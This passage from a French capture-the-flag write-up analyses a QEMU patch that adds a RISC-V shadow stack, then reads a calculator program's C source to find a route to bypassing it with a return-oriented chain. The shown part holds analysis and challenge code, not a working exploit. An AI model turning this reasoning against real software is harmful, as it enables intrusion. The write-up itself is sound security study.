</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">calc</span><span class="p">(</span><span class="n">node_root</span><span class="p">,</span> <span class="n">result</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Le programme d√©finit une directive <code>define</code> √† partir de cette instruction qui sera appell√©e √† chaque prologue de fonction de la calculatrice. On en d√©duit donc qu&rsquo;√† chaque appel de fonction, l&rsquo;adresse de retour contenue dans le registre <code>RA</code> sera stock√©e dans la dark_page. Pour mieux comprendre l√† o√π le programme veut en venir il nous faut analyser le patch de la fonction <code>trans_jalr</code>.</p>
<h4 id="analyse-du-patch-de-linstruction-jalr">Analyse du patch de l&rsquo;instruction &ldquo;jalr&rdquo;</h4>
<p>En architecture RISC-V l&rsquo;instruction <code>jalr</code> o√π &ldquo;Jump and Link Register&rdquo; se pr√©sente comme ceci: <code>jalr xa, xb, n</code> et effecute un saut indirect √† l&rsquo;adresse point√©e par <code>xb + n</code> en sauvegardant l&rsquo;adresse de retour dans <code>xa</code>. Cette instruction est notamment utilis√©e pour faire l&rsquo;√©quivalent d&rsquo;un <code>ret</code> en architecture intel lorsque elle est utilis√©e sous cette forme <code>jalr zero, ra, 0</code> et c&rsquo;est ce cas particulier qui est vis√© par le patch de QEMU:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// qemu.diff
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">---</span> <span class="n">a</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">riscv</span><span class="o">/</span><span class="n">insn_trans</span><span class="o">/</span><span class="n">trans_rvi</span><span class="p">.</span><span class="n">c</span><span class="p">.</span><span class="n">inc</span>
</span></span><span class="line"><span class="cl"><span class="o">+++</span> <span class="n">b</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">riscv</span><span class="o">/</span><span class="n">insn_trans</span><span class="o">/</span><span class="n">trans_rvi</span><span class="p">.</span><span class="n">c</span><span class="p">.</span><span class="n">inc</span>
</span></span><span class="line"><span class="cl"><span class="err">@@</span> <span class="o">-</span><span class="mi">65</span><span class="p">,</span><span class="mi">6</span> <span class="o">+</span><span class="mi">65</span><span class="p">,</span><span class="mi">30</span> <span class="err">@@</span> <span class="k">static</span> <span class="kt">bool</span> <span class="nf">trans_jalr</span><span class="p">(</span><span class="n">DisasContext</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span> <span class="n">arg_jalr</span> <span class="o">*</span><span class="n">a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">     <span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">     <span class="nf">gen_set_gpri</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">a</span><span class="o">-&gt;</span><span class="n">rd</span><span class="p">,</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">pc_succ_insn</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="k">if</span> <span class="p">(</span><span class="n">a</span><span class="o">-&gt;</span><span class="n">rd</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">a</span><span class="o">-&gt;</span><span class="n">rs1</span> <span class="o">==</span> <span class="n">xRA</span> <span class="o">&amp;&amp;</span> <span class="n">a</span><span class="o">-&gt;</span><span class="n">imm</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="n">TCGLabel</span> <span class="o">*</span><span class="n">shadow_pact_end</span> <span class="o">=</span> <span class="nf">gen_new_label</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="n">TCGv</span> <span class="n">dark_offset</span> <span class="o">=</span> <span class="nf">tcg_temp_new</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="n">TCGv_i32</span> <span class="n">csr_darkoff</span> <span class="o">=</span> <span class="nf">tcg_constant_i32</span><span class="p">(</span><span class="n">CSR_DARKOFF</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="nf">gen_helper_csrr</span><span class="p">(</span><span class="n">dark_offset</span><span class="p">,</span> <span class="n">cpu_env</span><span class="p">,</span> <span class="n">csr_darkoff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="nf">tcg_gen_brcondi_tl</span><span class="p">(</span><span class="n">TCG_COND_EQ</span><span class="p">,</span> <span class="n">dark_offset</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">shadow_pact_end</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="nf">tcg_gen_addi_tl</span><span class="p">(</span><span class="n">dark_offset</span><span class="p">,</span> <span class="n">dark_offset</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span> <span class="o">*</span> <span class="nf">get_xlen_bytes</span><span class="p">(</span><span class="n">ctx</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="nf">gen_helper_csrw</span><span class="p">(</span><span class="n">cpu_env</span><span class="p">,</span> <span class="n">csr_darkoff</span><span class="p">,</span> <span class="n">dark_offset</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="n">TCGv</span> <span class="n">darkest_address</span> <span class="o">=</span> <span class="nf">get_darkest_address</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">dark_offset</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="n">TCGv</span> <span class="n">dark_pc</span> <span class="o">=</span> <span class="nf">tcg_temp_new</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="nf">tcg_gen_qemu_ld_tl</span><span class="p">(</span><span class="n">dark_pc</span><span class="p">,</span> <span class="n">darkest_address</span><span class="p">,</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">mem_idx</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>                           <span class="n">MO_ALIGN</span> <span class="o">|</span> <span class="n">MO_TE</span> <span class="o">|</span> <span class="nf">size_memop</span><span class="p">(</span><span class="nf">get_xlen_bytes</span><span class="p">(</span><span class="n">ctx</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="nf">tcg_gen_brcond_tl</span><span class="p">(</span><span class="n">TCG_COND_EQ</span><span class="p">,</span> <span class="n">cpu_pc</span><span class="p">,</span> <span class="n">dark_pc</span><span class="p">,</span> <span class="n">shadow_pact_end</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="nf">tcg_gen_st_tl</span><span class="p">(</span><span class="n">cpu_pc</span><span class="p">,</span> <span class="n">cpu_env</span><span class="p">,</span> <span class="nf">offsetof</span><span class="p">(</span><span class="n">CPURISCVState</span><span class="p">,</span> <span class="n">badaddr</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="nf">generate_exception</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">RISCV_EXCP_SHADOW</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="nf">gen_set_label</span><span class="p">(</span><span class="n">shadow_pact_end</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>
</span></span></code></pre></div><p>Cette modification de l&rsquo;instruction ret s&rsquo;appuie sur les deux instructions customs et va v√©rifier √† chaque ret que la derni√®re adresse de retour pr√©sente sur la dark_page est bien √©gale √† celle contenue dans le registre RA, dans le cas contraire, l&rsquo;exception <code>RISCV_EXCP_SHADOW</code> est lev√©e et le processeur s&rsquo;arr√™te. A chaque ret, le compteur dark_offset est d√©cr√©ment√©e de 8 (la taille d&rsquo;une adresse), aussi si le compteur vaut 0, la fonction retourne sans lever d&rsquo;exception.</p>
<p>On en d√©duit que l&rsquo;objectif de ce patch est de mettre en place une <code>shadow stack</code> pour √©viter les techniques d&rsquo;exploitations visant √† overwrite la valeur de l&rsquo;adresse de retour comme les stack buffer overflows! Si on veut exploiter notre progamme avec une ROP-chain par exemple, il nous faudra un moyen d&rsquo;outrepasser cette protection suppl√©mentaire.</p>
<p>Je passe sur l&rsquo;analyse du fichier <code>binutils.diff</code> dont la seule utilit√© est de permettre aux composants comme gcc de fonctionner avec les instructions custom.</p>
<h3 id="analyse-du-code-1">Analyse du code</h3>
<p>Tout d&rsquo;abord, le binaire a √©t√© compil√© avec la NX, mais sans le PIE, ni ASLR ce qui va nous faciliter la t√¢che pour l&rsquo;exploiter üòÅ, en revanche un Canary est pr√©sent sur la stack en plus de la mise en place de la shadow stack.</p>
<p>Le programme commence par lire un input de 128 octets depuis stdin, et va ensuite le passer en param√®tre √† la fonction <code>yy_scan_string</code> qui fait partie de l&rsquo;API de <code>Yacc</code>, un analyseur syntaxique qui va parser notre string pour la convertir en <code>ASTs</code> qui repr√©senteront l&rsquo;expression que la calculatrice √©valuera. Ces ASTs seront parcourus via un <code>DFS</code> dans la fonction <code>dispatch</code> que voil√†:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// calculator/src/calc.c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">error_kind</span> <span class="nf">dispatch</span> <span class="p">(</span><span class="kt">node_t</span><span class="o">*</span> <span class="n">node</span><span class="p">,</span> <span class="kt">int64_t</span> <span class="n">results</span><span class="p">[],</span> <span class="kt">bool</span> <span class="n">completed</span><span class="p">[])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">IN_SHADOW</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">error_kind</span> <span class="n">err</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">get_completion</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">completed</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ERROR_NO_ERROR</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kt">node_t</span> <span class="o">*</span><span class="n">node_l</span> <span class="o">=</span> <span class="n">node</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">.</span><span class="n">binop</span><span class="p">.</span><span class="n">node_l</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">get_completion</span><span class="p">(</span><span class="n">node_l</span><span class="p">,</span> <span class="n">completed</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">err</span> <span class="o">=</span> <span class="nf">dispatch</span><span class="p">(</span><span class="n">node_l</span><span class="p">,</span> <span class="n">results</span><span class="p">,</span> <span class="n">completed</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">err</span> <span class="o">!=</span> <span class="n">ERROR_NO_ERROR</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">err</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kt">node_t</span> <span class="o">*</span><span class="n">node_r</span> <span class="o">=</span> <span class="n">node</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">.</span><span class="n">binop</span><span class="p">.</span><span class="n">node_r</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">get_completion</span><span class="p">(</span><span class="n">node_r</span><span class="p">,</span> <span class="n">completed</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">err</span> <span class="o">=</span> <span class="nf">dispatch</span><span class="p">(</span><span class="n">node_r</span><span class="p">,</span> <span class="n">results</span><span class="p">,</span> <span class="n">completed</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">err</span> <span class="o">!=</span> <span class="n">ERROR_NO_ERROR</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">err</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">switch</span> <span class="p">(</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">kind</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">NODE_PLUS</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="nf">do_plus</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">results</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">NODE_MINUS</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="nf">do_minus</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">results</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">NODE_TIMES</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="nf">do_times</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">results</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">NODE_DIVIDE</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="nf">do_divide</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">results</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">NODE_POWER</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="n">err</span> <span class="o">=</span> <span class="nf">do_power</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">results</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">err</span> <span class="o">!=</span> <span class="n">ERROR_NO_ERROR</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">err</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">ERROR_NODE_KIND_UNKNOWN</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">completed</span><span class="p">[</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">.</span><span class="n">binop</span><span class="p">.</span><span class="n">id</span><span class="p">]</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">ERROR_NO_ERROR</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Chaque node repr√©sente soit un nombre soit une expression qui sera √©valu√©e. Mais dans un premier lieu, l&rsquo;AST est pass√©e en param√®tre avec notre input dans la fonction <code>secure_calc</code> et <code>count_ops</code> qui se chargent de v√©rifier que le nombre d&rsquo;expressions constituant notre arbre n&rsquo;exc√®de pas 16:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// calculator/src/calc.c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define MAX_OPS 16
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="p">[...]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">uint8_t</span> <span class="nf">count_ops</span> <span class="p">(</span><span class="kt">char</span> <span class="n">input</span><span class="p">[])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">IN_SHADOW</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kt">uint8_t</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint8_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">c</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">do</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="sc">&#39;+&#39;</span> <span class="o">||</span> <span class="n">c</span> <span class="o">==</span> <span class="sc">&#39;-&#39;</span> <span class="o">||</span> <span class="n">c</span> <span class="o">==</span> <span class="sc">&#39;/&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">count</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="sc">&#39;*&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">count</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;*&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">i</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">c</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">error_kind</span> <span class="nf">secure_calc</span> <span class="p">(</span><span class="kt">char</span> <span class="n">input</span><span class="p">[],</span> <span class="kt">node_t</span><span class="o">*</span> <span class="n">node_root</span><span class="p">,</span> <span class="kt">int64_t</span><span class="o">*</span> <span class="n">result</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">IN_SHADOW</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">MAX_OPS</span> <span class="o">&lt;</span> <span class="nf">count_ops</span><span class="p">(</span><span class="n">input</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ERROR_OPS_LIMIT</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">calc</span><span class="p">(</span><span class="n">node_root</span><span class="p">,</span> <span class="n">result</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>En effet, dans le corps de la fonction <code>calc</code>, on peut observer la pr√©sence de deux buffers de taille 16:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// calculator/src/calc.c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">error_kind</span> <span class="nf">calc</span> <span class="p">(</span><span class="kt">node_t</span><span class="o">*</span> <span class="n">node_root</span><span class="p">,</span> <span class="kt">int64_t</span><span class="o">*</span> <span class="n">result</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">IN_SHADOW</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kt">int64_t</span> <span class="n">results</span><span class="p">[</span><span class="n">MAX_OPS</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="kt">bool</span> <span class="n">completed</span><span class="p">[</span><span class="n">MAX_OPS</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nf">memzero</span><span class="p">(</span><span class="n">results</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int64_t</span><span class="p">)</span> <span class="o">*</span> <span class="n">MAX_OPS</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memzero</span><span class="p">(</span><span class="n">completed</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="o">*</span> <span class="n">MAX_OPS</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">node_root</span><span class="o">-&gt;</span><span class="n">kind</span> <span class="o">==</span> <span class="n">NODE_NUMBER</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">result</span> <span class="o">=</span> <span class="n">node_root</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">.</span><span class="n">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ERROR_NO_ERROR</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">error_kind</span> <span class="n">err</span> <span class="o">=</span> <span class="nf">dispatch</span><span class="p">(</span><span class="n">node_root</span><span class="p">,</span> <span class="n">results</span><span class="p">,</span> <span class="n">completed</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">err</span> <span class="o">!=</span> <span class="n">ERROR_NO_ERROR</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">err</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">result</span> <span class="o">=</span> <span class="n">results</span><span class="p">[</span><span class="n">node_root</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">.</span><span class="n">binop</span><span class="p">.</span><span class="n">id</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">ERROR_NO_ERROR</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Le premier buffer, <code>results[MAX_OPS]</code> va se charger de garder les valeurs r√©sultants de l&rsquo;√©valuation de chaque expression. et le buffer <code>completed[MAX_OPS]</code> indique si une expression constituant l&rsquo;arbre a d√©j√† √©t√© √©valu√©e ou non. Le programme va parcourir un AST cr√©√© √† partir de l&rsquo;expression pass√© en input, pour cel√† il va s&rsquo;appuyer sur les fichiers d&rsquo;analyse syntaxique <code>ast.l</code> et <code>ast.y</code>, il va ensuite se baser sur la node root (logiquement la derni√®re op√©ration √† √™tre calcul√©) pour descendre l&rsquo;AST. Il est important de noter que l&rsquo;id associ√© √† une node repr√©sente sonc indice dans le tableau et que les nombres simples ne sont pas consid√©r√©s comme des expressions √† part enti√®re. Voil√† un sch√©ma repr√©sentant l&rsquo;algorithme de calcul effecut√© pour √©valuer l&rsquo;expression <code>8 * (((3 + 5) / 2) + 2**3)</code>:</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 544 1033"
      >
      <g transform='translate(8,16)'>
<path d='M 144,32 L 384,32' fill='none' stroke='currentColor'></path>
<path d='M 0,48 L 32,48' fill='none' stroke='currentColor'></path>
<path d='M 32,48 L 64,48' fill='none' stroke='currentColor'></path>
<path d='M 64,48 L 96,48' fill='none' stroke='currentColor'></path>
<path d='M 96,48 L 128,48' fill='none' stroke='currentColor'></path>
<path d='M 128,48 L 160,48' fill='none' stroke='currentColor'></path>
<path d='M 160,48 L 192,48' fill='none' stroke='currentColor'></path>
<path d='M 192,48 L 224,48' fill='none' stroke='currentColor'></path>
<path d='M 224,48 L 256,48' fill='none' stroke='currentColor'></path>
<path d='M 256,48 L 288,48' fill='none' stroke='currentColor'></path>
<path d='M 288,48 L 320,48' fill='none' stroke='currentColor'></path>
<path d='M 320,48 L 352,48' fill='none' stroke='currentColor'></path>
<path d='M 352,48 L 384,48' fill='none' stroke='currentColor'></path>
<path d='M 384,48 L 416,48' fill='none' stroke='currentColor'></path>
<path d='M 416,48 L 448,48' fill='none' stroke='currentColor'></path>
<path d='M 448,48 L 480,48' fill='none' stroke='currentColor'></path>
<path d='M 480,48 L 512,48' fill='none' stroke='currentColor'></path>
<path d='M 0,80 L 32,80' fill='none' stroke='currentColor'></path>
<path d='M 32,80 L 64,80' fill='none' stroke='currentColor'></path>
<path d='M 64,80 L 96,80' fill='none' stroke='currentColor'></path>
<path d='M 96,80 L 128,80' fill='none' stroke='currentColor'></path>
<path d='M 128,80 L 160,80' fill='none' stroke='currentColor'></path>
<path d='M 160,80 L 192,80' fill='none' stroke='currentColor'></path>
<path d='M 192,80 L 224,80' fill='none' stroke='currentColor'></path>
<path d='M 224,80 L 256,80' fill='none' stroke='currentColor'></path>
<path d='M 256,80 L 288,80' fill='none' stroke='currentColor'></path>
<path d='M 288,80 L 320,80' fill='none' stroke='currentColor'></path>
<path d='M 320,80 L 352,80' fill='none' stroke='currentColor'></path>
<path d='M 352,80 L 384,80' fill='none' stroke='currentColor'></path>
<path d='M 384,80 L 416,80' fill='none' stroke='currentColor'></path>
<path d='M 416,80 L 448,80' fill='none' stroke='currentColor'></path>
<path d='M 448,80 L 480,80' fill='none' stroke='currentColor'></path>
<path d='M 480,80 L 512,80' fill='none' stroke='currentColor'></path>
<path d='M 144,160 L 392,160' fill='none' stroke='currentColor'></path>
<path d='M 0,176 L 32,176' fill='none' stroke='currentColor'></path>
<path d='M 32,176 L 64,176' fill='none' stroke='currentColor'></path>
<path d='M 64,176 L 96,176' fill='none' stroke='currentColor'></path>
<path d='M 96,176 L 128,176' fill='none' stroke='currentColor'></path>
<path d='M 128,176 L 160,176' fill='none' stroke='currentColor'></path>
<path d='M 160,176 L 192,176' fill='none' stroke='currentColor'></path>
<path d='M 192,176 L 224,176' fill='none' stroke='currentColor'></path>
<path d='M 224,176 L 256,176' fill='none' stroke='currentColor'></path>
<path d='M 256,176 L 288,176' fill='none' stroke='currentColor'></path>
<path d='M 288,176 L 320,176' fill='none' stroke='currentColor'></path>
<path d='M 320,176 L 352,176' fill='none' stroke='currentColor'></path>
<path d='M 352,176 L 384,176' fill='none' stroke='currentColor'></path>
<path d='M 384,176 L 416,176' fill='none' stroke='currentColor'></path>
<path d='M 416,176 L 448,176' fill='none' stroke='currentColor'></path>
<path d='M 448,176 L 480,176' fill='none' stroke='currentColor'></path>
<path d='M 480,176 L 512,176' fill='none' stroke='currentColor'></path>
<path d='M 0,208 L 32,208' fill='none' stroke='currentColor'></path>
<path d='M 32,208 L 64,208' fill='none' stroke='currentColor'></path>
<path d='M 64,208 L 96,208' fill='none' stroke='currentColor'></path>
<path d='M 96,208 L 128,208' fill='none' stroke='currentColor'></path>
<path d='M 128,208 L 160,208' fill='none' stroke='currentColor'></path>
<path d='M 160,208 L 192,208' fill='none' stroke='currentColor'></path>
<path d='M 192,208 L 224,208' fill='none' stroke='currentColor'></path>
<path d='M 224,208 L 256,208' fill='none' stroke='currentColor'></path>
<path d='M 256,208 L 288,208' fill='none' stroke='currentColor'></path>
<path d='M 288,208 L 320,208' fill='none' stroke='currentColor'></path>
<path d='M 320,208 L 352,208' fill='none' stroke='currentColor'></path>
<path d='M 352,208 L 384,208' fill='none' stroke='currentColor'></path>
